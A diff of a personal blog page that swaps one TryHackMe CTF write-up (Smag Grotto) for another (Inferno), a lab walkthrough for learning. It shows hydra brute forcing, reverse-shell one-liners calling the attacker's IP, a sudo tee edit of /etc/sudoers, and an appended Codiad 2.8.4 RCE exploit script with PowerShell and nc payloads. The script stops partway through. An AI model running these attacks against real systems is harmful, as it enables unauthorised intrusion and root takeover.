@@ -1,18 +1,18 @@
 <!DOCTYPE html>
 <html lang="en-us">
     <head><meta charset='utf-8'>
-<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='Learn about PCAP files using Wireshark and crontab. Very intersting sudo exploit.'><title>TryHackMe: Smag Grotto Writeup</title>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='Learn about bruteforcing, custom exploit and an interesting sudo exploit.'><title>TryHackMe: Inferno Writeup</title>
 
-<link rel='canonical' href='https://chaudhary1337.github.io/p/tryhackme-smag-grotto-writeup/'>
+<link rel='canonical' href='https://chaudhary1337.github.io/p/tryhackme-inferno-writeup/'>
 
-<link rel="stylesheet" href="/scss/style.min.css"><meta property='og:title' content='TryHackMe: Smag Grotto Writeup'>
-<meta property='og:description' content='Learn about PCAP files using Wireshark and crontab. Very intersting sudo exploit.'>
-<meta property='og:url' content='https://chaudhary1337.github.io/p/tryhackme-smag-grotto-writeup/'>
+<link rel="stylesheet" href="/scss/style.min.css"><meta property='og:title' content='TryHackMe: Inferno Writeup'>
+<meta property='og:description' content='Learn about bruteforcing, custom exploit and an interesting sudo exploit.'>
+<meta property='og:url' content='https://chaudhary1337.github.io/p/tryhackme-inferno-writeup/'>
 <meta property='og:site_name' content='Tanishq Chaudhary'>
-<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='pcap' /><meta property='article:tag' content='crontab' /><meta property='article:tag' content='sudo' /><meta property='article:published_time' content='2021-06-15T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2021-06-15T00:00:00&#43;00:00'/><meta property='og:image' content='https://i.imgur.com/C5DIAQd.png' />
-<meta name="twitter:title" content="TryHackMe: Smag Grotto Writeup">
-<meta name="twitter:description" content="Learn about PCAP files using Wireshark and crontab. Very intersting sudo exploit."><meta name="twitter:card" content="summary_large_image">
-    <meta name="twitter:image" content='https://i.imgur.com/C5DIAQd.png' />
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='brute-forcing' /><meta property='article:tag' content='web-work' /><meta property='article:tag' content='sudo' /><meta property='article:published_time' content='2021-06-26T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2021-06-26T00:00:00&#43;00:00'/><meta property='og:image' content='https://i.imgur.com/4t9185h.jpg' />
+<meta name="twitter:title" content="TryHackMe: Inferno Writeup">
+<meta name="twitter:description" content="Learn about bruteforcing, custom exploit and an interesting sudo exploit."><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='https://i.imgur.com/4t9185h.jpg' />
 <script type="application/javascript">
 var doNotTrack = false;
 if (!doNotTrack) {
@@ -354,9 +354,9 @@ m125 -66 c16 -18 19 -37 19 -134 0 -97 -3 -116 -19 -134 -24 -27 -48 -27 -72
     <article class="has-image main-article">
     <header class="article-header">
         <div class="article-image">
-            <a href="/p/tryhackme-smag-grotto-writeup/">
+            <a href="/p/tryhackme-inferno-writeup/">
                 
-                    <img src="https://i.imgur.com/C5DIAQd.png" loading="lazy" alt="Featured image of post TryHackMe: Smag Grotto Writeup" />
+                    <img src="https://i.imgur.com/4t9185h.jpg" loading="lazy" alt="Featured image of post TryHackMe: Inferno Writeup" />
                 
             </a>
         </div>
@@ -374,12 +374,12 @@ m125 -66 c16 -18 19 -37 19 -134 0 -97 -3 -116 -19 -134 -24 -27 -48 -27 -72
     
 
     <h2 class="article-title">
-        <a href="/p/tryhackme-smag-grotto-writeup/">TryHackMe: Smag Grotto Writeup</a>
+        <a href="/p/tryhackme-inferno-writeup/">TryHackMe: Inferno Writeup</a>
     </h2>
 
     
     <h3 class="article-subtitle">
-        Learn about PCAP files using Wireshark and crontab. Very intersting sudo exploit.
+        Learn about bruteforcing, custom exploit and an interesting sudo exploit.
     </h3>
     <footer class="article-time">
         <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
@@ -390,97 +390,204 @@ m125 -66 c16 -18 19 -37 19 -134 0 -97 -3 -116 -19 -134 -24 -27 -48 -27 -72
 
 
 
-        <time class="article-time--published">Jun 15, 2021</time>
+        <time class="article-time--published">Jun 26, 2021</time>
     </footer></div>
 </header>
 
     <section class="article-content">
-    <p><a class="link" href="https://tryhackme.com/room/room_name_here"  target="_blank" rel="noopener"
+    <p><a class="link" href="https://tryhackme.com/room/inferno"  target="_blank" rel="noopener"
     >Play</a></p>
 <h2 id="1-scanning--enumeration">1. Scanning &amp; Enumeration</h2>
 <p>We do the below scans in parallel.</p>
 <h3 id="11-port-scanning">1.1. Port Scanning</h3>
-<pre><code>Not shown: 998 closed ports
-PORT   STATE SERVICE VERSION
-22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+<pre><code>Not shown: 954 closed ports
+PORT      STATE    SERVICE           VERSION
+21/tcp    open     ftp?
+22/tcp    open     ssh               OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
 | ssh-hostkey: 
-|   2048 74:e0:e1:b4:05:85:6a:15:68:7e:16:da:f2:c7:6b:ee (RSA)
-|   256 bd:43:62:b9:a1:86:51:36:f8:c7:df:f9:0f:63:8f:a3 (ECDSA)
-|_  256 f9:e7:da:07:8f:10:af:97:0b:32:87:c9:32:d7:1b:76 (ED25519)
-80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+|   2048 d7:ec:1a:7f:62:74:da:29:64:b3:ce:1e:e2:68:04:f7 (RSA)
+|   256 de:4f:ee:fa:86:2e:fb:bd:4c:dc:f9:67:73:02:84:34 (ECDSA)
+|_  256 e2:6d:8d:e1:a8:d0:bd:97:cb:9a:bc:03:c3:f8:d8:85 (ED25519)
+23/tcp    open     telnet?
+25/tcp    open     smtp?
+|_smtp-commands: Couldn't establish connection on port 25
+80/tcp    open     http              Apache httpd 2.4.29 ((Ubuntu))
 | http-methods: 
-|_  Supported Methods: GET HEAD POST OPTIONS
-|_http-server-header: Apache/2.4.18 (Ubuntu)
-|_http-title: Smag
+|_  Supported Methods: GET POST OPTIONS HEAD
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Dante's Inferno
+88/tcp    open     kerberos-sec?
+106/tcp   open     pop3pw?
+110/tcp   open     pop3?
+389/tcp   open     ldap?
+443/tcp   open     https?
+464/tcp   open     kpasswd5?
+636/tcp   open     ldapssl?
+777/tcp   open     multiling-http?
+783/tcp   open     spamassassin?
+808/tcp   open     ccproxy-http?
+873/tcp   open     rsync?
+1001/tcp  open     webpush?
+1236/tcp  open     bvcontrol?
+1300/tcp  open     h323hostcallsc?
+1309/tcp  filtered jtag-server
+1805/tcp  filtered enl-name
+1863/tcp  filtered msnp
+2000/tcp  open     cisco-sccp?
+2003/tcp  open     finger?
+|_finger: ERROR: Script execution failed (use -d to debug)
+2121/tcp  open     ccproxy-ftp?
+2601/tcp  open     zebra?
+2602/tcp  open     ripd?
+2604/tcp  open     ospfd?
+2605/tcp  open     bgpd?
+2607/tcp  open     connection?
+2608/tcp  open     wag-service?
+4224/tcp  open     xtell?
+5051/tcp  open     ida-agent?
+5432/tcp  open     postgresql?
+5555/tcp  open     freeciv?
+5666/tcp  open     nrpe?
+5998/tcp  filtered ncd-diag
+6346/tcp  open     gnutella?
+6566/tcp  open     sane-port?
+6667/tcp  open     irc?
+|_irc-info: Unable to open connection
+8021/tcp  open     ftp-proxy?
+8081/tcp  open     blackice-icecap?
+8088/tcp  open     radan-http?
+9418/tcp  open     git?
+10000/tcp open     snet-sensor-mgmt?
+10082/tcp open     amandaidx?
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-</code></pre><p>Nothing too special.</p>
+</code></pre><p>We see 42 serives running. Going through and testing each one of them is not possible.</p>
 <h3 id="12-web-enumeration">1.2. Web Enumeration</h3>
 <pre><code>┌──(kali㉿kali)-[~]
-└─$ gobuster dir -w /usr/share/wordlists/dirbuste-list-2.3-medium.txt -x 'php,html,txt' -t 32 -q -219
-/index.php            (Status: 200) [Size: 402]
-/mail                 (Status: 301) [Size: 311] [10.10.62.219/mail/]
-</code></pre><p><code>/mail/</code> looks interesting. We explore that below.</p>
-<h3 id="13-web-exploration">1.3. Web Exploration</h3>
-<p><img src="https://i.imgur.com/teZV7zS.png" alt="homepage of smag grotto"  /></p>
-<p><img src="https://i.imgur.com/dAFRcPS.png" alt="the mail directory in the website"  /></p>
-<p>We add the <code>smag.thm</code> line in <code>/etc/hosts</code> file, looking at their emails.</p>
+└─$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x 'php,html,txt' -t 32 -q -u 10.10.125.29
+/index.html           (Status: 200) [Size: 638]
+/inferno              (Status: 401) [Size: 459]
+</code></pre><h3 id="13-web-exploration">1.3. Web Exploration</h3>
+<p><img src="https://i.imgur.com/XdFKN0A.jpg" alt="homepage of thm room inferno"  /></p>
+<p>We see some quotes, which may be from the inferno book. We can explore them later if needed.</p>
+<p><img src="https://i.imgur.com/AClskWf.png" alt="inferno page found asking for login and password"  /></p>
+<p>We see the page demanding login and password. Maybe we can try bruteforcing?</p>
+<p>Possible usernames:</p>
+<ul>
+<li>admin</li>
+<li>dante (the guy who wrote inferno)</li>
+<li>inferno (the name of the room)</li>
+</ul>
+<h3 id="14-bruteforcing">1.4. Bruteforcing</h3>
 <pre><code>┌──(kali㉿kali)-[~]
-└─$ cat /etc/hosts
-127.0.0.1       localhost
-127.0.1.1       kali
-10.10.62.219    smag.thm
-# The following lines are desirable for IPv6 capable hosts
-::1     localhost ip6-localhost ip6-loopback
-ff02::1 ip6-allnodes
-ff02::2 ip6-allrouters
-</code></pre><h3 id="14-wireshark">1.4. Wireshark</h3>
-<p>The website has a file, which we can download just by clicking on it. Exploring it further.</p>
-<p>In one of the packets, we found:</p>
-<pre><code>POST /login.php HTTP/1.1
-Host: development.smag.thm
-User-Agent: curl/7.47.0
-Accept: */*
-Content-Length: 39
-Content-Type: application/x-www-form-urlencoded
+└─$ hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.125.29 http-get /inferno -t 64
+Hydra v9.1 (c) 2020 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
-username={hidden}&amp;password={wow_very_nice}HTTP/1.1 200 OK
-Date: Wed, 03 Jun 2020 18:04:07 GMT
-Server: Apache/2.4.18 (Ubuntu)
-Content-Length: 0
-Content-Type: text/html; charset=UTF-8
-</code></pre><p>Add the <code>development.smag.thm</code> along with <code>smag.thm</code> domain in the <code>/etc/hosts</code> file. It thus looks like the following.</p>
-<pre><code>┌──(kali㉿kali)-[/tmp]
-└─$ cat /etc/hosts
-127.0.0.1       localhost
-127.0.1.1       kali
-10.10.62.219    smag.thm development.smag.thm
-# The following lines are desirable for IPv6 capable hosts
-::1     localhost ip6-localhost ip6-loopback
-ff02::1 ip6-allnodes
-ff02::2 ip6-allrouters
-</code></pre><h2 id="2-foothold">2. Foothold</h2>
-<p>Logging in using the credentials from wireshark, we get a place to enter commands.
-<img src="https://i.imgur.com/nqqDVou.png" alt="admin panel on the subdomain and logged in using creds"  /></p>
-<p>I tried a bunch of commands, and this one stuck: <code>php -r '$sock=fsockopen(&quot;MY_KALI_IP&quot;,4444);exec(&quot;sh &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);'</code></p>
-<p>We get a shell!</p>
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-06-26 00:13:47
+[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~224132 tries per task
+[DATA] attacking http-get://10.10.125.29:80/inferno
+[STATUS] 6189.00 tries/min, 6189 tries in 00:01h, 14338210 to do in 38:37h, 64 active
+[80][http-get] host: 10.10.125.29   login: admin   password: {password}
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-06-26 00:16:05
+</code></pre><p>Great! After logging in, we see another login form. Okay &hellip;</p>
+<p><img src="https://i.imgur.com/1hOuete.png" alt="another login form in the inferno page"  /></p>
+<h3 id="15-codiad">1.5. Codiad</h3>
+<p>Trying out the same creds gets us in. Now I looked for exploits for <code>codiad</code>.</p>
 <pre><code>┌──(kali㉿kali)-[~]
-└─$ nc -lvnp 4444                  
-listening on [any] 4444 ...
-connect to [10.17.8.184] from (UNKNOWN) [10.10.62.219] 33886
-bash -i
-bash: cannot set terminal process group (707): Inappropriate ioctl for device
-bash: no job control in this shell
-www-data@smag:/var/www/development.smag.thm$ 
-</code></pre><h2 id="3-privesc">3. PrivEsc</h2>
-<p>Looking around, I found something intersting in <code>/etc/crontab</code> in the last line.</p>
-<pre><code>www-data@smag:/$ cat /etc/crontab
+└─$ searchsploit codiad                      
+-------------------------- ---------------------------------
+ Exploit Title            |  Path
+-------------------------- ---------------------------------
+Codiad 2.4.3 - Multiple V | php/webapps/35585.txt
+Codiad 2.5.3 - Local File | php/webapps/36371.txt
+Codiad 2.8.4 - Remote Cod | multiple/webapps/49705.py
+-------------------------- ---------------------------------
+Shellcodes: No Results
+</code></pre><p>Let&rsquo;s try the RCE one!</p>
+<p>Running the exploit, we get <code>[-] Login failed! Please check your username and password.</code></p>
+<p>But, we know for a fact that it is correct - otherwise we wouldn&rsquo;t be able to login! Whats happening?</p>
+<p>Recall we had to login <em>another</em> form before we saw this. Maybe adding the header of login password, as we saw before would help.</p>
+<h3 id="16-custom-exploit">1.6. Custom Exploit</h3>
+<p>I first inspect the request itself, by intercepting it using burp suite.</p>
+<pre><code>GET /inferno HTTP/1.1
+Host: 10.10.125.29
+Cache-Control: max-age=0
+Authorization: Basic {base64_encoded_authorization}
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Connection: close
+
+</code></pre><p>Looks like the line <code>Authorization: Basic {base64_encoded_authorization}</code> is the one we are looking for.</p>
+<p>Decoing, we get <code>admin:{password}</code>. Great! Our hypothesis was correct. We just need to add this auth line for all the requests made.</p>
+<p>Add the line <code>&quot;Authorization&quot;: &quot;Basic {base64_encoded_authorization}&quot;</code> to headers dictionary wherever present, or create a new one wherever not.</p>
+<p>The code is attached at the very bottom.</p>
+<h2 id="2-foothold">2. Foothold</h2>
+<h3 id="21-codilad-custom-rce">2.1. Codilad Custom RCE</h3>
+<p>Okay finally! Following the instructions we get a reverse shell.</p>
+<pre><code>┌──(kali㉿kali)-[~/Desktop/tools/files]
+└─$ python3 codiad.py http://10.10.125.29/inferno/ admin {password} 10.17.8.184 1337 linux
+[+] Please execute the following command on your vps: 
+echo 'bash -c &quot;bash -i &gt;/dev/tcp/10.17.8.184/1338 0&gt;&amp;1 2&gt;&amp;1&quot;' | nc -lnvp 1337
+nc -lnvp 1338
+[+] Please confirm that you have done the two command above [y/n]
+[Y/n] y
+[+] Starting...
+[+] Login Content : {&quot;status&quot;:&quot;success&quot;,&quot;data&quot;:{&quot;username&quot;:&quot;admin&quot;}}
+[+] Login success!
+[+] Getting writeable path...
+[+] Path Content : {&quot;status&quot;:&quot;success&quot;,&quot;data&quot;:{&quot;name&quot;:&quot;inferno&quot;,&quot;path&quot;:&quot;\/var\/www\/html\/inferno&quot;}}
+[+] Writeable Path : /var/www/html/inferno
+[+] Sending payload...
+{&quot;status&quot;:&quot;error&quot;,&quot;message&quot;:&quot;No Results Returned&quot;}
+[+] Exploit finished!
+[+] Enjoy your reverse shell!
+</code></pre><p><img src="https://i.imgur.com/2WKJRyi.png" alt="getting remote code execution on the thm room inferno"  /></p>
+<p>Looks like the connection was immediately closed. Uh. Let&rsquo;s try again?</p>
+<p>Works! This time as soon as I got in, I spawned a bunch more bash shells. Threw in some <code>/bin/sh</code> ones as well XD</p>
+<ul>
+<li><code>python3 -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'</code></li>
+<li><code>python3 -c 'import pty; pty.spawn(&quot;/bin/sh&quot;)'</code></li>
+</ul>
+<h3 id="22-exploring">2.2 Exploring</h3>
+<p><strong>Users</strong></p>
+<pre><code>cd /home
+ls
+dante
+</code></pre><p><strong>SUID</strong></p>
+<pre><code>find / -type f -perm -u=s 2&gt; /dev/null
+/bin/su
+/bin/umount
+/bin/ping
+/bin/mount
+/bin/fusermount
+/usr/bin/gpasswd
+/usr/bin/newgidmap
+/usr/bin/pkexec
+/usr/bin/chfn
+/usr/bin/passwd
+/usr/bin/newuidmap
+/usr/bin/traceroute6.iputils
+/usr/bin/newgrp
+/usr/bin/at
+/usr/bin/chsh
+/usr/bin/sudo
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/snapd/snap-confine
+/usr/lib/openssh/ssh-keysign
+</code></pre><p><strong>crontab</strong></p>
+<pre><code>$ cat /etc/crontab    
 cat /etc/crontab
-# /etc/crontab: system-wide crontab
+# /etc/crontab: system-wide crontab  
 # Unlike any other crontab you don't have to run the `crontab'
-# command to install the new version when you edit this file
-# and files in /etc/cron.d. These files also have username fields,
+# command to install the new version when you edit this file          
+# and files in /etc/cron.d. These files also have username fields,          
 # that none of the other crontabs do.
-
 SHELL=/bin/sh
 PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
 
@@ -489,46 +596,309 @@ PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
 25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.daily )
 47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.weekly )
 52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.monthly )
-*  *    * * *   root    /bin/cat /opt/.backups/jake_id_rsa.pub.backup &gt; /home/jake/.ssh/authorized_keys
 #
-</code></pre><p>We see the file <code>/opt/.backups/jake_id_rsa.pub.backup</code> is put into jake&rsquo;s authorized keys. This means that if I can get my own, kali SSH public key in here, I would be able to login without a password.</p>
-<p>First, we need to make sure we have writing permissions.</p>
-<pre><code>www-data@smag:/$ ls -la /opt/.backups/jake_id_rsa.pub.backup
-ls -la /opt/.backups/jake_id_rsa.pub.backup
--rw-rw-rw- 1 root root 563 Jun  5  2020 /opt/.backups/jake_id_rsa.pub.backup
-</code></pre><p>Great! Now I copy pasted my own <code>id_rsa.pub</code> key here.</p>
-<pre><code>www-data@smag:/$ echo &quot;ssh-rsa {wow_nice_looking_key_uh} kali@kali&quot; &gt; /opt/.backups/jake_id_rsa.pub.backup
-</code></pre><p>And &hellip;</p>
-<pre><code>┌──(kali㉿kali)-[/tmp]
-└─$ ssh jake@10.10.62.219      
-The authenticity of host '10.10.62.219 (10.10.62.219)' can't be established.
-ECDSA key fingerprint is SHA256:MMv7NKmeLS/aEUSOLy0NbyGrLCEKErHJTp1cIvsxnpA.
+</code></pre><p><strong>Kernel status</strong></p>
+<pre><code>$ uname -a
+uname -a
+Linux Inferno 4.15.0-130-generic #134-Ubuntu SMP Tue Jan 5 20:46:26 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
+</code></pre><p>Upto date</p>
+<h3 id="23-linpeas-enumeration">2.3. LinPEAS enumeration</h3>
+<p><img src="https://i.imgur.com/ScLa4Dx.png" alt=""  /></p>
+<pre><code>[+] Sudo version
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-version                                              
+Sudo version 1.8.21p2 
+</code></pre><pre><code>[+] Backup folders
+drwxr-xr-x 2 root root 4096 Jun 26 03:55 /var/backups                                                                     
+total 32
+-rw-r--r-- 1 root root 30810 Jan 11 15:22 apt.extended_states.0
+
+drwx------ 2 root root 4096 Jan 11 15:19 /etc/lvm/backup
+</code></pre><pre><code>[+] Searching specific hashes inside files - less false positives (limit 70)
+/etc/apache2/.htpasswd:$apr1$UIfo4gwg$N4DRURQTtq/wytcy8pdGq.
+</code></pre><p>Nothing that we don&rsquo;t already know.</p>
+<h3 id="24-manual-exploration">2.4. Manual Exploration</h3>
+<pre><code>$ ls -la /home/dante/Downloads
+ls -la /home/dante/Downloads
+total 4420
+drwxr-xr-x  2 root  root     4096 Jan 11 15:29 .
+drwxr-xr-x 13 dante dante    4096 Jan 11 15:46 ..
+-rw-r--r--  1 root  root     1511 Nov  3  2020 .download.dat
+</code></pre><p>We see some hex characters. Let&rsquo;s use <a class="link" href="http://icyberchef.com/"  target="_blank" rel="noopener"
+    >CyberChef</a> to decode. We get the password for dante user!</p>
+<p><code>dante:{this_is_in_the_last_line!}</code></p>
+<h2 id="3-privesc">3. PrivEsc</h2>
+<pre><code>┌──(kali㉿kali)-[~]
+└─$ ssh dante@10.10.125.29          
+The authenticity of host '10.10.125.29 (10.10.125.29)' can't be established.
+ECDSA key fingerprint is SHA256:QMSVr7PFqk9fLxwYBp9LCg9SjU6kioP9tJbL6ed0mZI.
 Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
-Warning: Permanently added '10.10.62.219' (ECDSA) to the list of known hosts.
-Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-142-generic x86_64)
+Warning: Permanently added '10.10.125.29' (ECDSA) to the list of known hosts.
+dante@10.10.125.29's password: 
+Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-130-generic x86_64)
 
  * Documentation:  https://help.ubuntu.com
  * Management:     https://landscape.canonical.com
  * Support:        https://ubuntu.com/advantage
 
-Last login: Fri Jun  5 10:15:15 2020
-jake@smag:~$ 
-</code></pre><p>Success!</p>
-<p>Now for PrivEsc to root. Exploring a bit, I found:</p>
-<pre><code>jake@smag:~$ sudo -l
-Matching Defaults entries for jake on smag:
+  System information as of Sat Jun 26 05:36:39 UTC 2021
+
+  System load:  0.0               Processes:           620
+  Usage of /:   42.2% of 8.79GB   Users logged in:     0
+  Memory usage: 77%               IP address for eth0: 10.10.125.29
+  Swap usage:   0%
+
+
+39 packages can be updated.
+0 updates are security updates.
+
+
+Last login: Mon Jan 11 15:56:07 2021 from 192.168.1.109
+dante@Inferno:~$ 
+</code></pre><p>Yess! Finally SSH after the ***tty shells. This has the same issue btw, so make sure to spam shells (<code>sh</code> looks immune, bash gets killed :thonk:).</p>
+<h3 id="31-sudo">3.1. sudo</h3>
+<pre><code>$ sudo -l
+Matching Defaults entries for dante on Inferno:
     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
 
-User jake may run the following commands on smag:
-    (ALL : ALL) NOPASSWD: /usr/bin/apt-get
-</code></pre><p>Using <a class="link" href="https://gtfobins.github.io/gtfobins/apt-get/#sudo"  target="_blank" rel="noopener"
-    >GTFOBins - apt-get sudo exploit</a></p>
-<pre><code>jake@smag:~$ sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
-# whoami 
-root
-# 
-</code></pre><p>System compromised!</p>
+User dante may run the following commands on Inferno:
+    (root) NOPASSWD: /usr/bin/tee
 
+</code></pre><p>We have it here on <a class="link" href="https://gtfobins.github.io/gtfobins/tee/#sudo"  target="_blank" rel="noopener"
+    >GTFOBins</a>.</p>
+<p>Here&rsquo;s the one liner exploit for sudo tee: <code>echo &quot;dante    ALL=(ALL:ALL) ALL&quot; | sudo tee -a /etc/sudoers</code></p>
+<p>What happened here?</p>
+<p>man tee:</p>
+<ul>
+<li>man page of tee: <code>tee - read from standard input and write to standard output and files</code></li>
+<li>-a flag appends data</li>
+<li>we echo the line giving us all the permissions</li>
+<li>and pipe it to sudo tee with the -a flag to append it in the /etc/sudoers file</li>
+</ul>
+<p>Resultant:</p>
+<pre><code>$ sudo -l
+Matching Defaults entries for dante on Inferno:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User dante may run the following commands on Inferno:
+    (root) NOPASSWD: /usr/bin/tee
+    (ALL : ALL) ALL
+</code></pre><p>Great!</p>
+<pre><code>$ sudo su
+root@Inferno:/home/dante# sh
+# cd /root
+# ls
+proof.txt
+# cat proof.txt
+Congrats!
+
+You've rooted Inferno!
+
+{system_compromised}
+
+mindsflee
+
+</code></pre><p>And we are done!</p>
+<h2 id="a-appendix-rce-codilad-custom-exploit-code">A. Appendix: RCE Codilad Custom Exploit Code</h2>
+<pre><code class="language-python=" data-lang="python="># Exploit Title: Codiad 2.8.4 - Remote Code Execution (Authenticated)
+# Discovery by: WangYihang
+# Vendor Homepage: http://codiad.com/
+# Software Links : https://github.com/Codiad/Codiad/releases
+# Tested Version: Version: 2.8.4
+# CVE: CVE-2018-14009
+
+#!/usr/bin/env python
+# encoding: utf-8
+import requests
+import sys
+import json
+import base64
+
+session = requests.Session()
+
+
+def login(domain, username, password):
+    global session
+    url = domain + &quot;/components/user/controller.php?action=authenticate&quot;
+    data = {
+        &quot;username&quot;: username,
+        &quot;password&quot;: password,
+        &quot;theme&quot;: &quot;default&quot;,
+        &quot;language&quot;: &quot;en&quot;,
+    }
+    response = session.post(
+        url,
+        data=data,
+        verify=False,
+        headers={&quot;Authorization&quot;: &quot;Basic {base64_encoded_authorization}&quot;},
+    )
+    content = response.text
+    print(&quot;[+] Login Content : %s&quot; % (content))
+    if 'status&quot;:&quot;success&quot;' in content:
+        return True
+
+
+def get_write_able_path(domain):
+    global session
+    url = domain + &quot;/components/project/controller.php?action=get_current&quot;
+    response = session.get(
+        url, verify=False, headers={&quot;Authorization&quot;: &quot;Basic {base64_encoded_authorization}&quot;}
+    )
+    content = response.text
+    print(&quot;[+] Path Content : %s&quot; % (content))
+    json_obj = json.loads(content)
+    if json_obj[&quot;status&quot;] == &quot;success&quot;:
+        return json_obj[&quot;data&quot;][&quot;path&quot;]
+    else:
+        return False
+
+
+def base64_encode_2_bytes(host, port):
+    payload = &quot;&quot;&quot;
+    $client = New-Object System.Net.Sockets.TCPClient(&quot;__HOST__&quot;,__PORT__);
+    $stream = $client.GetStream();
+    [byte[]]$bytes = 0..255|%{0};
+    while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
+        $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
+        $sendback = (iex $data 2&gt;&amp;1 | Out-String );
+        $sendback2  = $sendback + &quot;PS &quot; + (pwd).Path + &quot;&gt; &quot;;
+        $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
+        $stream.Write($sendbyte,0,$sendbyte.Length);
+        $stream.Flush();
+    }
+    $client.Close();
+    &quot;&quot;&quot;
+    result = &quot;&quot;
+    for i in payload.replace(&quot;__HOST__&quot;, host).replace(&quot;__PORT__&quot;, str(port)):
+        result += i + &quot;\x00&quot;
+    return base64.b64encode(result.encode()).decode().replace(&quot;\n&quot;, &quot;&quot;)
+
+
+def build_powershell_payload(host, port):
+    preffix = &quot;powershell -ep bypass -NoLogo -NonInteractive -NoProfile -enc &quot;
+    return preffix + base64_encode_2_bytes(host, port).replace(&quot;+&quot;, &quot;%2b&quot;)
+
+
+def exploit(domain, username, password, host, port, path, platform):
+    global session
+    url = (
+        domain
+        + &quot;components/filemanager/controller.php?type=1&amp;action=search&amp;path=%s&quot; % (path)
+    )
+    if platform.lower().startswith(&quot;win&quot;):
+        # new version escapeshellarg
+        # escapeshellarg on windows will quote the arg with &quot;&quot;
+        # so we need to try twice
+        payload = &quot;||%s||&quot; % (build_powershell_payload(host, port))
+        payload = &quot;search_string=Hacker&amp;search_file_type=&quot; + payload
+        headers = {
+            &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded; charset=UTF-8&quot;,
+            &quot;Authorization&quot;: &quot;Basic {base64_encoded_authorization}&quot;,
+        }
+        response = session.post(url, data=payload, headers=headers, verify=False)
+        content = response.text
+        print(content)
+        # old version escapeshellarg
+        payload = &quot;%%22||%s||&quot; % (build_powershell_payload(host, port))
+        payload = &quot;search_string=Hacker&amp;search_file_type=&quot; + payload
+        headers = {
+            &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded; charset=UTF-8&quot;,
+            &quot;Authorization&quot;: &quot;Basic {base64_encoded_authorization}&quot;,
+        }
+        response = session.post(url, data=payload, headers=headers, verify=False)
+        content = response.text
+        print(content)
+    else:
+        # payload = '''SniperOJ%22%0A%2Fbin%2Fbash+-c+'sh+-i+%3E%26%2Fdev%2Ftcp%2F''' + host + '''%2F''' + port + '''+0%3E%261'%0Agrep+%22SniperOJ'''
+        payload = '&quot;%%0Anc %s %d|/bin/bash %%23' % (host, port)
+        payload = &quot;search_string=Hacker&amp;search_file_type=&quot; + payload
+        headers = {
+            &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded; charset=UTF-8&quot;,
+            &quot;Authorization&quot;: &quot;Basic {base64_encoded_authorization}&quot;,
+        }
+        response = session.post(url, data=payload, headers=headers, verify=False)
+        content = response.text
+        print(content)
+
+
+def promote_yes(hint):
+    print(hint)
+    while True:
+        ans = input(&quot;[Y/n] &quot;).lower()
+        if ans == &quot;n&quot;:
+            return False
+        elif ans == &quot;y&quot;:
+            return True
+        else:
+            print(&quot;Incorrect input&quot;)
+
+
+def main():
